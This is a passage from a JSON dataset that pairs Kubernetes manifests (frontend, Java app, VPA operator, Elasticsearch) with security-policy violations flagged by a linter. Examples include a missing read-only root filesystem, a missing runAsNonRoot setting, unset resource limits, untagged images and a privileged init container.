    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: aosipenko99/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "10733",
    "manifest_path": "data/manifests/the_stack_sample/sample_4130.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: aosipenko99/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "10734",
    "manifest_path": "data/manifests/the_stack_sample/sample_4130.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: aosipenko99/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "10735",
    "manifest_path": "data/manifests/the_stack_sample/sample_4130.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: aosipenko99/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "10736",
    "manifest_path": "data/manifests/the_stack_sample/sample_4131.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8081\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "10737",
    "manifest_path": "data/manifests/the_stack_sample/sample_4131.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8081\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "10738",
    "manifest_path": "data/manifests/the_stack_sample/sample_4131.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8081\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "10739",
    "manifest_path": "data/manifests/the_stack_sample/sample_4131.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8081\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "10740",
    "manifest_path": "data/manifests/the_stack_sample/sample_4132.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vertical-pod-autoscaler-operator\n  namespace: openshift-vertical-pod-autoscaler\n  labels:\n    k8s-app: vertical-pod-autoscaler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: vertical-pod-autoscaler-operator\n  template:\n    metadata:\n      labels:\n        k8s-app: vertical-pod-autoscaler-operator\n    spec:\n      serviceAccountName: vertical-pod-autoscaler-operator\n      containers:\n      - name: vertical-pod-autoscaler-operator\n        image: VPA_OPERATOR_IMAGE\n        command:\n        - vertical-pod-autoscaler-operator\n        args:\n        - -alsologtostderr\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_IMAGE\n          value: VPA_OPERAND_IMAGE\n        ports:\n        - containerPort: 8443\n        resources:\n          requests:\n            cpu: 20m\n            memory: 50Mi\n      securityContext:\n        runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"vertical-pod-autoscaler-operator\" is using an invalid container image, \"VPA_OPERATOR_IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10741",
    "manifest_path": "data/manifests/the_stack_sample/sample_4132.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vertical-pod-autoscaler-operator\n  namespace: openshift-vertical-pod-autoscaler\n  labels:\n    k8s-app: vertical-pod-autoscaler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: vertical-pod-autoscaler-operator\n  template:\n    metadata:\n      labels:\n        k8s-app: vertical-pod-autoscaler-operator\n    spec:\n      serviceAccountName: vertical-pod-autoscaler-operator\n      containers:\n      - name: vertical-pod-autoscaler-operator\n        image: VPA_OPERATOR_IMAGE\n        command:\n        - vertical-pod-autoscaler-operator\n        args:\n        - -alsologtostderr\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_IMAGE\n          value: VPA_OPERAND_IMAGE\n        ports:\n        - containerPort: 8443\n        resources:\n          requests:\n            cpu: 20m\n            memory: 50Mi\n      securityContext:\n        runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vertical-pod-autoscaler-operator\" does not have a read-only root file system"
  },
  {
    "id": "10742",
    "manifest_path": "data/manifests/the_stack_sample/sample_4132.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vertical-pod-autoscaler-operator\n  namespace: openshift-vertical-pod-autoscaler\n  labels:\n    k8s-app: vertical-pod-autoscaler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: vertical-pod-autoscaler-operator\n  template:\n    metadata:\n      labels:\n        k8s-app: vertical-pod-autoscaler-operator\n    spec:\n      serviceAccountName: vertical-pod-autoscaler-operator\n      containers:\n      - name: vertical-pod-autoscaler-operator\n        image: VPA_OPERATOR_IMAGE\n        command:\n        - vertical-pod-autoscaler-operator\n        args:\n        - -alsologtostderr\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_IMAGE\n          value: VPA_OPERAND_IMAGE\n        ports:\n        - containerPort: 8443\n        resources:\n          requests:\n            cpu: 20m\n            memory: 50Mi\n      securityContext:\n        runAsNonRoot: true\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"vertical-pod-autoscaler-operator\" not found"
  },
  {
    "id": "10743",
    "manifest_path": "data/manifests/the_stack_sample/sample_4132.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vertical-pod-autoscaler-operator\n  namespace: openshift-vertical-pod-autoscaler\n  labels:\n    k8s-app: vertical-pod-autoscaler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: vertical-pod-autoscaler-operator\n  template:\n    metadata:\n      labels:\n        k8s-app: vertical-pod-autoscaler-operator\n    spec:\n      serviceAccountName: vertical-pod-autoscaler-operator\n      containers:\n      - name: vertical-pod-autoscaler-operator\n        image: VPA_OPERATOR_IMAGE\n        command:\n        - vertical-pod-autoscaler-operator\n        args:\n        - -alsologtostderr\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: VERTICAL_POD_AUTOSCALER_IMAGE\n          value: VPA_OPERAND_IMAGE\n        ports:\n        - containerPort: 8443\n        resources:\n          requests:\n            cpu: 20m\n            memory: 50Mi\n      securityContext:\n        runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vertical-pod-autoscaler-operator\" has memory limit 0"
  },
  {
    "id": "10744",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"elasticsearch-master\" is using an invalid container image, \"elasticsearch\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10745",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"increase-vm-max-map\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10746",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"elasticsearch-master\" does not have a read-only root file system"
  },
  {
    "id": "10747",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"increase-vm-max-map\" does not have a read-only root file system"
  },
  {
    "id": "10748",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"increase-vm-max-map\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "10749",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"increase-vm-max-map\" is privileged"
  },
  {
    "id": "10750",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"elasticsearch-master\" is not set to runAsNonRoot"
  },
  {
    "id": "10751",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"increase-vm-max-map\" is not set to runAsNonRoot"
  },
  {
    "id": "10752",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"elasticsearch-master\" has cpu request 0"
  },
  {
    "id": "10753",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"increase-vm-max-map\" has cpu request 0"
  },
  {
    "id": "10754",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"elasticsearch-master\" has memory limit 0"
  },
  {
    "id": "10755",
    "manifest_path": "data/manifests/the_stack_sample/sample_4134.yaml",
